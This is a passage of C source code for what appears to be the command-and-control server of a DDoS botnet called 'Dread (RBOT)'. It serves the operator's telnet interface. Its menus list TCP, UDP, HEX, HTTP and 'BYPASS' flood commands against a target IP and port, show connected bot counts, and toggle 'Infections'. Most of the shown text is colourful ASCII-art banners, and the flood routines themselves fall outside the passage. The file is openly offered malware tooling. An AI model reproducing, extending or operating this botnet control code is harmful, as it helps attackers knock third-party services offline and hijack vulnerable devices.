    if (send(datafd, x6ascii_banner_line6, strlen(x6ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x6ascii_banner_line7, strlen(x6ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x6ascii_banner_line8, strlen(x6ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x6ascii_banner_line9, strlen(x6ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
    while (1) {
        char input[800];
        sprintf(input, "\033[1;90m%s\033[38;5;250m@\033[1;90mDread\033[38;5;250m >\033[1;37m ", uname);
        if (send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        break;
    }
    managements[datafd].connected = 1;

    while (fdgets(buf, sizeof buf, datafd) > 0) {
        if (strstr(buf, "help"))
        {
            char hp1[800];
            char hp2[800];
            char hp3[800];
            char hp4[800];
            char hp5[800];
            char hp6[800];
            char hp7[800];
            char hp8[800];
            char hp9[800];
            char hp10[800];
            char hp11[800];//∙
            char hp12[800];
            char hp13[800];

            sprintf(hp1, "\033[38;5;250m╔═══════════════════════════════════════════════════╗\r\n");
            sprintf(hp2, "\033[38;5;250m║     \033[1;97mРБОТ     \033[38;5;250m╔═════════════════════╗     \033[1;97mРБОТ     \033[38;5;250m║\r\n");
            sprintf(hp3, "\033[38;5;250m╠══════════════╣ \033[1;97mServerside Commands \033[38;5;250m╠══════════════╣\r\n");
            sprintf(hp4, "\033[38;5;250m║              ╚═════════════════════╝              ║\r\n");
            sprintf(hp5, "\033[38;5;250m║             \033[1;97mEnd Session∙∙∙∙∙∙∙∙logout             \033[38;5;250m║\r\n");
            sprintf(hp6, "\033[38;5;250m║             \033[1;97mClean Terminal∙∙∙∙∙∙∙∙cls             \033[38;5;250m║\r\n");
            sprintf(hp7, "\033[38;5;250m║             \033[1;97mAttack Commands∙∙∙∙attack             \033[38;5;250m║\r\n");
            sprintf(hp8, "\033[38;5;250m║             \033[1;97mView Info∙∙∙∙∙∙∙∙∙∙∙∙info             \033[38;5;250m║\r\n");
            sprintf(hp9, "\033[38;5;250m║             \033[1;97mChange CNC∙∙∙∙∙∙∙∙∙∙∙∙banners         \033[38;5;250m║\r\n");
            sprintf(hp10,"\033[38;5;250m║             \033[1;97mResolve IP∙∙∙ .resolve [ip]           \033[38;5;250m║\r\n");
            sprintf(hp11,"\033[38;5;250m║             \033[1;97mDisable Infections∙!* OFF             \033[38;5;250m║\r\n");
            sprintf(hp12,"\033[38;5;250m║             \033[1;97mEnable Infections∙∙∙!* ON             \033[38;5;250m║\r\n");
            sprintf(hp13,"\033[38;5;250m╚═══════════════════════════════════════════════════╝\r\n");

            if (send(datafd, hp1, strlen(hp1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp2, strlen(hp2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp3, strlen(hp3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp4, strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp5, strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp6, strlen(hp6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp7, strlen(hp7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp8, strlen(hp8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp9, strlen(hp9), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp10, strlen(hp10), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp11, strlen(hp11), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp12, strlen(hp12), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp13, strlen(hp13), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf,"attack"))
        {
            char atk1[800];
            char atk2[800];
            char atk3[800];
            char atk4[800];
            char atk5[800];
            char atk6[800];
            char atk7[800];
            char atk8[800];
            char atk9[800];
            char atk10[800];
            char atk11[800];
            char atk12[800];

            sprintf(atk1, "\033[38;5;250m╔═══════════════════════════════════════════════════╗\r\n");
            sprintf(atk2, "\033[38;5;250m║     \033[1;97mРБОТ     \033[38;5;250m╔═════════════════════╗     \033[1;97mРБОТ     \033[38;5;250m║\r\n");
            sprintf(atk3, "\033[38;5;250m╠══════════════╣   \033[1;97mAttack Commands   \033[38;5;250m╠══════════════╣\r\n");
            sprintf(atk4, "\033[38;5;250m║              ╚═════════════════════╝              ║\r\n");
            sprintf(atk5, "\033[38;5;250m║ \033[1;97m. TCP [IP] [PORT] [TIME] 32 [FLAG] 1459 10        \033[38;5;250m║\r\n");
            sprintf(atk6, "\033[38;5;250m║ \033[1;97m. UDP [IP] [PORT] [TIME] 1459 10 32               \033[38;5;250m║\r\n");
            sprintf(atk7, "\033[38;5;250m║ \033[1;97m. HEX [IP] [PORT] [TIME]                          \033[38;5;250m║\r\n");
            sprintf(atk8, "\033[38;5;250m║ \033[1;97m. RHEX [IP] [PORT] [TIME]                         \033[38;5;250m║\r\n");
            sprintf(atk9, "\033[38;5;250m║ \033[1;97m. TCP [IP] [PORT] [TIME] 32 BYPASS 2000 10        \033[38;5;250m║\r\n");
            sprintf(atk10,"\033[38;5;250m║ \033[1;97m. HTTP [POST/GET] [IP] [PORT] [TIME] 1024         \033[38;5;250m║\r\n");
            sprintf(atk11,"\033[38;5;250m║ \033[1;97m.STOP                                             \033[38;5;250m║\r\n");
            sprintf(atk12,"\033[38;5;250m╚═══════════════════════════════════════════════════╝\r\n");

            if (send(datafd, atk1, strlen(atk1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, atk2, strlen(atk2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, atk3, strlen(atk3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, atk4, strlen(atk4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, atk5, strlen(atk5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, atk6, strlen(atk6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, atk7, strlen(atk7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, atk8, strlen(atk8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, atk9, strlen(atk9), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, atk10, strlen(atk10), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, atk11, strlen(atk11), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, atk12, strlen(atk12), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, "info"))
        {
            char inf1[800];
            char inf2[800];
            char inf3[800];
            char inf4[800];
            char inf5[800];
            char inf6[800];
            char inf7[800];
            char inf8[800];

            sprintf(inf1, "\033[38;5;250m╔═══════════════════════════════════════════════════╗\r\n");
            sprintf(inf2, "\033[38;5;250m║     \033[37mРБОТ     \033[38;5;250m╔═════════════════════╗     \033[37mРБОТ     \033[38;5;250m║\r\n");
            sprintf(inf3, "\033[38;5;250m╚══════════════╣   \033[37mNet Information   \033[38;5;250m╠══════════════╝\r\n");
            sprintf(inf4, "\033[38;5;250m               ╚═════════════════════╝              \r\n");
            sprintf(inf5, "\033[38;5;250m                 \033[37mUsername: \033[90m%s                      \r\n", uname);
            sprintf(inf6, "\033[38;5;250m                 \033[37mServer Count: \033[90m%d                  \r\n", BotsConnected());
            sprintf(inf7, "\033[38;5;250m                 \033[37mUsers Online: \033[90m%d                  \r\n", OperatorsConnected, scannerreport);
            sprintf(inf8, "\033[38;5;250m\r\n");

            if (send(datafd, inf1, strlen(inf1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, inf2, strlen(inf2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, inf3, strlen(inf3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, inf4, strlen(inf4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, inf5, strlen(inf5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, inf6, strlen(inf6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, inf7, strlen(inf7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, inf8, strlen(inf8), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, "banners"))
        {
            char ban1[800];
            char ban2[800];
            char ban3[800];
            char ban4[800];
            char ban5[800];
            char ban6[800];
            char ban7[800];
            char ban8[800];
            char ban9[800];
            char ban10[800];
            char ban11[800];
            char ban12[800];
            //char ban13[800];
            char ban14[800];

            sprintf(ban1,  "\033[38;5;250m╔═══════════════════════════════════════════════════╗\r\n");
            sprintf(ban2,  "\033[38;5;250m║     \033[37mРБОТ     \033[38;5;250m╔═════════════════════╗     \033[37mРБОТ     \033[38;5;250m║\r\n");
            sprintf(ban3,  "\033[38;5;250m╠══════════════╣     \033[37mCNC Banners     \033[38;5;250m╠══════════════╣\r\n");
            sprintf(ban4,  "\033[38;5;250m║              ╚═════════════════════╝              ║\r\n");
            sprintf(ban5,  "\033[38;5;250m║                  \033[38;5;93mYakuza  \033[37m- \033[38;5;93m.yakuza                \033[38;5;250m║\r\n");
            sprintf(ban6,  "\033[38;5;250m║                  \033[38;5;93mMana    \033[37m- \033[38;5;93m.mana                  \033[38;5;250m║\r\n");
            sprintf(ban7,  "\033[38;5;250m║                  \033[0;32mTimeout \033[37m- \033[0;32m.timeout               \033[38;5;250m║\r\n");
            sprintf(ban8,  "\033[38;5;250m║                  \033[1;35mSenpai  \033[37m- \033[1;35m.senpai                \033[38;5;250m║\r\n");
            sprintf(ban9,  "\033[38;5;250m║                  \033[1;36mCayosin  \033[37m- \033[1;36m.cayosin              \033[38;5;250m║\r\n");
            sprintf(ban10, "\033[38;5;250m║                  \033[36mGalaxy  \033[37m- \033[36m.galaxy                \033[38;5;250m║\r\n");
            sprintf(ban11, "\033[38;5;250m║                  \033[0;95mHentai   \033[37m- \033[0;95m.hentai               \033[38;5;250m║\r\n");
            sprintf(ban12, "\033[38;5;250m║                  \033[1;31mHoHo    \033[37m- .hoho                  \033[38;5;250m║\r\n");
            //sprintf(ban13, "\033[38;5;250m║                  \033[1;35mJoker   \033[37m- \033[1;35m.joker                 \033[38;5;250m║\r\n");
            sprintf(ban14, "\033[38;5;250m╚═══════════════════════════════════════════════════╝\r\n");

            if (send(datafd, ban1, strlen(ban1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban2, strlen(ban2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban3, strlen(ban3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban4, strlen(ban4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban5, strlen(ban5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban6, strlen(ban6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban7, strlen(ban7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban8, strlen(ban8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban9, strlen(ban9), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban10, strlen(ban10), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban11, strlen(ban11), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban12, strlen(ban12), MSG_NOSIGNAL) == -1) goto end;
            //if (send(datafd, ban13, strlen(ban13), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, ban14, strlen(ban14), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ".yakuza"))
        {
            char lmfao9asciibannerline1 [800];
            char lmfao9asciibannerline2 [800];
            char lmfao9asciibannerline3 [800];
            char lmfao9asciibannerline4 [800];
            char lmfao9asciibannerline5 [800];
            char lmfao9asciibannerline6 [800];
            char lmfao9asciibannerline7 [800];
            char lmfao9asciibannerline8 [800];
        
            sprintf(lmfao9asciibannerline1,   "\033[2J\033[1H"); //display main header
            sprintf(lmfao9asciibannerline2,   "\033[96m            \033[38;5;93m██\033[97m╗   \033[38;5;93m██\033[97m╗ \033[38;5;93m█████\033[97m╗ \033[38;5;93m██\033[97m╗  \033[38;5;93m██\033[97m╗\033[38;5;93m██\033[97m╗   \033[38;5;93m██\033[97m╗\033[38;5;93m███████\033[97m╗ \033[38;5;93m█████\033[97m╗ \r\n");
            sprintf(lmfao9asciibannerline3,   "\033[97m            \033[97m╚\033[38;5;93m██\033[97m╗ \033[38;5;93m██\033[97m╔╝\033[38;5;93m██\033[97m╔══\033[38;5;93m██\033[97m╗\033[38;5;93m██\033[97m║ \033[38;5;93m██\033[97m╔╝\033[38;5;93m██\033[97m║   \033[38;5;93m██\033[97m║╚══\033[38;5;93m███\033[97m╔╝\033[38;5;93m██\033[97m╔══\033[38;5;93m██\033[97m╗    \r\n");
            sprintf(lmfao9asciibannerline4,   "\033[97m             \033[97m╚\033[38;5;93m████\033[97m╔╝ \033[38;5;93m███████\033[97m║\033[38;5;93m█████\033[97m╔╝ \033[38;5;93m██\033[97m║   \033[38;5;93m██\033[97m║  \033[38;5;93m███\033[97m╔╝ \033[38;5;93m███████\033[97m║    \r\n");
            sprintf(lmfao9asciibannerline5,   "\033[97m              \033[97m╚\033[38;5;93m██\033[97m╔╝  \033[38;5;93m██\033[97m╔══\033[38;5;93m██\033[97m║\033[38;5;93m██\033[97m╔═\033[38;5;93m██\033[97m╗ \033[38;5;93m██\033[97m║   \033[38;5;93m██\033[97m║ \033[38;5;93m███\033[97m╔╝  \033[38;5;93m██\033[97m╔══\033[38;5;93m██\033[97m║     \r\n");
            sprintf(lmfao9asciibannerline6,   "\033[97m               \033[38;5;93m██\033[97m║   \033[38;5;93m██\033[97m║  \033[38;5;93m██\033[97m║\033[38;5;93m██\033[97m║  \033[38;5;93m██\033[97m╗╚\033[38;5;93m██████\033[97m╔╝\033[38;5;93m███████\033[97m╗\033[38;5;93m██\033[97m║  \033[38;5;93m██\033[97m║    \r\n");
            sprintf(lmfao9asciibannerline7,   "\033[97m               ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝     \r\n");
            sprintf(lmfao9asciibannerline8,   "\033[90m                                                                                     \r\n");

            if(send(datafd, clearscreen,        strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, lmfao9asciibannerline1, strlen(lmfao9asciibannerline1), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, lmfao9asciibannerline2, strlen(lmfao9asciibannerline2), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, lmfao9asciibannerline3, strlen(lmfao9asciibannerline3), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, lmfao9asciibannerline4, strlen(lmfao9asciibannerline4), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, lmfao9asciibannerline5, strlen(lmfao9asciibannerline5), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, lmfao9asciibannerline6, strlen(lmfao9asciibannerline6), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, lmfao9asciibannerline7, strlen(lmfao9asciibannerline7), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, lmfao9asciibannerline8, strlen(lmfao9asciibannerline8), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ".mana"))
        {
            char manaouma1 [800];
            char manaouma2 [800];
            char manaouma3 [800];
            char manaouma4 [800];
            char manaouma5 [800];
            char manaouma6 [800];
            char manaouma7 [800];
            char manaouma8 [800];
            char manaouma9 [800];
            char manaouma10 [800];
            char manaouma11 [800];
            char manaouma12 [800];
            char manaouma13 [800];
            char manaouma14 [800];
            char manaouma15 [800];

            sprintf(manaouma1,"\033[2J\033[1H"); //display main header
            sprintf(manaouma2,"\033[38;5;93m[\033[01;35m+\033[38;5;93m] Welcome \033[01;35m %s \033[38;5;93m to Dread (RBOT) v1.3\033[01;35m...\033[0m\r\n", uname);
            sprintf(manaouma3,"\033[38;5;93m[\033[01;35m+\033[38;5;93m] \033[01;35mSetting up Mana terminal\033[38;5;93m...\r\n\r\n");
            sprintf(manaouma4,"\033[38;5;93m                             ╔╦╗ ╔═╗ ╔╗╔ ╔═╗                    \033[0m \r\n");
            sprintf(manaouma5,"\033[38;5;93m                             ║║║ ╠═╣ ║║║ ╠═╣                    \033[0m \r\n");
            sprintf(manaouma6,"\033[01;1;35m                             ╩ ╩ ╩ ╩ ╝╚╝ ╩ ╩                    \033[0m \r\n");
            sprintf(manaouma7,"\033[01;35m             ╔═══════════════════════════════════════════════╗   \033[0m \r\n");
            sprintf(manaouma8,"\033[01;35m             ║\033[01;37m- - - - - - - - - - -\033[01;35mMana\033[37m- - - - - - - - - - - \033[01;35m║   \033[0m \r\n");
            sprintf(manaouma9,"\033[01;35m             ║\033[01;37m- - - - - - \033[01;35mMana Ouma \033[38;5;93mIs So \033[01;35mAdorable\033[01;37m- - - - - -\033[01;35m║   \033[0m \r\n");
            sprintf(manaouma10,"\033[01;35m             ╚═══════════════════════════════════════════════╝   \033[0m \r\n");
            sprintf(manaouma11,"\r\n");
            sprintf(manaouma12,"\r\n");
            sprintf(manaouma13,"\033[01;35m ╔══════════════════════════════════════╗   \033[0m \r\n");
            sprintf(manaouma14,"\033[01;35m ║\033[01;37m- - - -\033[38;5;93mType \033[01;35mH̲E̲L̲P̲ \033[38;5;93mTo Get Started\033[01;37m- - - -\033[01;35m║   \033[0m \r\n");
            sprintf(manaouma15,"\033[01;35m ╚══════════════════════════════════════╝   \033[0m \r\n");

            if(send(datafd, manaouma1, strlen(manaouma1), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma2, strlen(manaouma2), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma3, strlen(manaouma3), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma4, strlen(manaouma4), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma5, strlen(manaouma5), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma6, strlen(manaouma6), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma7, strlen(manaouma7), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma8, strlen(manaouma8), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma9, strlen(manaouma9), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma10, strlen(manaouma10), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma11, strlen(manaouma11), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma12, strlen(manaouma12), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma13, strlen(manaouma13), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma14, strlen(manaouma14), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, manaouma15, strlen(manaouma15), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ".timeout"))
        {
            char timeoutbanner1 [800];
            char timeoutbanner2 [800];
            char timeoutbanner3 [800];
            char timeoutbanner4 [800];
            char timeoutbanner5 [800];
            char timeoutbanner6 [800];
            char timeoutbanner7 [800];
            char timeoutbanner8 [800];
            char timeoutbanner9 [800];
            char timeoutbanner10 [800];
            char timeoutbanner11 [800];

            sprintf(timeoutbanner1, "\033[2J\033[1;1H");//display main header
            sprintf(timeoutbanner2, "\033[0;35m             \r\n");
            sprintf(timeoutbanner3, "\033[1;30m             \r\n\033[0m");
            sprintf(timeoutbanner4, "\033[1;92m            ████████\033[95m╗\033[92m██\033[95m╗\033[92m███\033[95m╗   \033[92m███\033[95m╗\033[92m███████\033[95m╗ \033[92m██████\033[95m╗ \033[92m██\033[95m╗   \033[92m██\033[95m╗\033[92m████████\033[95m╗      \r\n");
            sprintf(timeoutbanner5, "\033[95m            ╚══██╔══╝██║████╗ ████║██╔════╝██╔═══██╗██║   ██║╚══██╔══╝      \r\n");
            sprintf(timeoutbanner6, "\033[1;92m               ██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m╔\033[92m████\033[95m╔\033[92m██\033[95m║\033[92m█████\033[95m╗  \033[92m██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║   \033[92m██\033[95m║   \033[92m██\033[95m║         \r\n");
            sprintf(timeoutbanner7, "\033[1;92m               ██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║╚\033[92m██\033[95m╔╝\033[92m██\033[95m║\033[92m██\033[95m╔══╝  \033[92m██\033[95m║   \033[92m██\033[95m║\033[92m██\033[95m║   \033[92m██\033[95m║   \033[92m██\033[95m║         \r\n");    
            sprintf(timeoutbanner8, "\033[1;92m               ██\033[95m║   \033[92m██\033]95m║\033[92m ██\033[95m║ ╚═╝ \033[92m██\033[95m║\033[92m███████\033[95m╗╚\033[92m██████\033[95m╔╝╚\033[92m██████\033[95m╔╝   \033[92m██\033[95m║         \r\n");
            sprintf(timeoutbanner9, "\033[95m               ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚═════╝    ╚═╝         \r\n");
            sprintf(timeoutbanner10, "\033[1;92m             \r\n");
            sprintf(timeoutbanner11, "\033[0;37m             \r\n\033[0m");

            if(send(datafd, timeoutbanner1, strlen(timeoutbanner1), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, timeoutbanner2, strlen(timeoutbanner2), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, timeoutbanner3, strlen(timeoutbanner3), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, timeoutbanner4, strlen(timeoutbanner4), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, timeoutbanner5, strlen(timeoutbanner5), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, timeoutbanner6, strlen(timeoutbanner6), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, timeoutbanner7, strlen(timeoutbanner7), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, timeoutbanner8, strlen(timeoutbanner8), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, timeoutbanner9, strlen(timeoutbanner9), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, timeoutbanner10, strlen(timeoutbanner10), MSG_NOSIGNAL) == -1) goto end;
            if(send(datafd, timeoutbanner11, strlen(timeoutbanner11), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ".senpai"))
        {
            char senpaibanner1 [800];
            char senpaibanner2 [800];
            char senpaibanner3 [800];
            char senpaibanner4 [800];
            char senpaibanner5 [800];
            char senpaibanner6 [800];
            char senpaibanner7 [800];
            char senpaibanner8 [800];
            char senpaibanner9 [800];
            char senpaibanner10 [800];
            char senpaibanner11 [800];
            
            sprintf(senpaibanner1, "\033[2J\033[1;1H");//display main header (im done commenting these out, you know what it does by now)
            sprintf(senpaibanner2, "\t \r\n");
            sprintf(senpaibanner3, "\033[1;35m           ███████\033[1;36m╗\033[1;35m███████\033[1;36m╗\033[1;35m███\033[1;36m╗   \033[1;35m██\033[1;36m╗\033[1;35m██████\033[1;36m╗  \033[1;35m█████\033[1;36m╗ \033[1;35m██\033[1;36m╗\r\n\033[0m");
            sprintf(senpaibanner4, "\033[1;35m           ██\033[1;36m╔════╝\033[1;35m██\033[1;36m╔════╝\033[1;35m████\033[1;36m╗  \033[1;35m██\033[1;36m║\033[1;35m██\033[1;36m╔══\033[1;35m██\033[1;36m╗\033[1;35m██\033[1;36m╔══\033[1;35m██\033[1;36m╗\033[1;35m██\033[1;36m║\r\n\033[0m");
            sprintf(senpaibanner5, "\033[1;35m           ███████\033[1;36m╗\033[1;35m█████\033[1;36m╗  \033[1;35m██\033[1;36m╔\033[1;35m██\033[1;36m╗ \033[1;35m██\033[1;36m║\033[1;35m██████\033[1;36m╔╝\033[1;35m███████\033[1;36m║\033[1;35m██\033[1;36m║\r\n\033[0m");
            sprintf(senpaibanner6, "\033[1;36m           ╚════\033[1;35m██\033[1;36m║\033[1;35m██\033[1;36m╔══╝  \033[1;35m██\033[1;36m║╚\033[1;35m██\033[1;36m╗\033[1;35m██\033[1;36m║\033[1;35m██\033[1;36m╔═══╝ \033[1;35m██\033[1;36m╔══\033[1;35m██\033[1;36m║\033[1;35m██\033[1;36m║\r\n\033[0m");
            sprintf(senpaibanner7, "\033[1;35m           ███████\033[1;36m║\033[1;35m███████\033[1;36m╗\033[1;35m██\033[1;36m║ ╚\033[1;35m████\033[1;36m║\033[1;35m██\033[1;36m║     \033[1;35m██\033[1;36m║  \033[1;35m██\033[1;36m║\033[1;35m██\033[1;36m║\r\n\033[0m");
            sprintf(senpaibanner8, "\033[1;36m           ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝\r\n\033[0m");
            sprintf(senpaibanner9, "\033[1;36m              \033[1;35m[\033[1;37m+\033[1;35m]\033[1;37mようこそ\033[1;36m \033[95;1m%s \033[1;37mTo The Dread  BotNet\033[1;35m[\033[1;37m+\033[1;35m]\r\n\033[0m", uname);
            sprintf(senpaibanner10, "\033[1;36m               \033[1;35m[\033[1;37m+\033[1;35m]\033[1;37mヘルプを入力してヘルプを表示する\033[1;35m[\033[1;37m+\033[1;35m]\r\n\033[0m");
            sprintf(senpaibanner11, "\t \r\n");
            
            if (send(datafd, senpaibanner1, strlen(senpaibanner1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, senpaibanner2, strlen(senpaibanner2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, senpaibanner3, strlen(senpaibanner3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, senpaibanner4, strlen(senpaibanner4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, senpaibanner5, strlen(senpaibanner5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, senpaibanner6, strlen(senpaibanner6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, senpaibanner7, strlen(senpaibanner7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, senpaibanner8, strlen(senpaibanner8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, senpaibanner9, strlen(senpaibanner9), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, senpaibanner10, strlen(senpaibanner10), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, senpaibanner11, strlen(senpaibanner11), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ".cayosin"))
        {
            char cayosinbanner1 [800];
            char cayosinbanner2 [800];
            char cayosinbanner3 [800];
            char cayosinbanner4 [800];
            char cayosinbanner5 [800];
            char cayosinbanner6 [800];
            char cayosinbanner7 [800];
            char cayosinbanner8 [800];
            char cayosinbanner9 [800];
            
            sprintf(cayosinbanner1, "\033[2J\033[1;1H");
            sprintf(cayosinbanner2, "\r\n");
            sprintf(cayosinbanner3, "\033[1;36m                 ╔═╗   ╔═╗   ╗ ╔   ╔═╗   ╔═╗   ═╔═   ╔╗╔              \033[0m \r\n");
            sprintf(cayosinbanner4, "\033[00;0m                 ║     ║═║   ╚╔╝   ║ ║   ╚═╗    ║    ║║║              \033[0m \r\n");
            sprintf(cayosinbanner5, "\033[0;90m                 ╚═╝   ╝ ╚   ═╝═   ╚═╝   ╚═╝   ═╝═   ╝╚╝              \033[0m \r\n");
            sprintf(cayosinbanner6, "\033[1;36m            ╔═══════════════════════════════════════════════╗         \033[0m \r\n");
            sprintf(cayosinbanner7, "\033[1;36m            ║\033[90m- - - - - \033[1;36m彼   ら  の  心   を  切  る\033[90m- - - - -\033[1;36m║\033[0m \r\n");
            sprintf(cayosinbanner8, "\033[1;36m            ║\033[90m- - - - - \033[0mType \033[1;36mHELP \033[0mfor \033[1;36mCommands List \033[90m- - - - -\033[1;36m║\033[0m \r\n");
            sprintf(cayosinbanner9, "\033[1;36m            ╚═══════════════════════════════════════════════╝         \033[0m \r\n\r\n");
            
            if (send(datafd, cayosinbanner1, strlen(cayosinbanner1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, cayosinbanner2, strlen(cayosinbanner2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, cayosinbanner3, strlen(cayosinbanner3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, cayosinbanner4, strlen(cayosinbanner4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, cayosinbanner5, strlen(cayosinbanner5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, cayosinbanner6, strlen(cayosinbanner6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, cayosinbanner7, strlen(cayosinbanner7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, cayosinbanner8, strlen(cayosinbanner8), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, cayosinbanner9, strlen(cayosinbanner9), MSG_NOSIGNAL) == -1) goto end;
        }

        if (strstr(buf, ".galaxy"))
        {
            char galaxybanner0 [800];
            char galaxybanner1 [800];
            char galaxybanner2 [800];
            char galaxybanner3 [800];
            char galaxybanner4 [800];
            char galaxybanner5 [800];
            char galaxybanner6 [800];
            char galaxybanner7 [800];
            char galaxybanner8 [800];
            char galaxybanner9 [800];
            char galaxybanner10 [800];
            char galaxybanner11 [800];
            char galaxybanner12 [800];
            char galaxybanner13 [800];
            
            sprintf(galaxybanner0,   "\033[2J\033[1;1H");
            sprintf(galaxybanner1,   "\033[35m      \033[36m  .d8888b. \033[35m          888       \033[32mo\033[35m                     \033[32m   .-o--.     \r\n");
            sprintf(galaxybanner2,   "\033[35m  \033[32m0    \033[36md88P  Y88b\033[35m          888             \033[32mO\033[35m               \033[32m  :O o O :    \r\n");
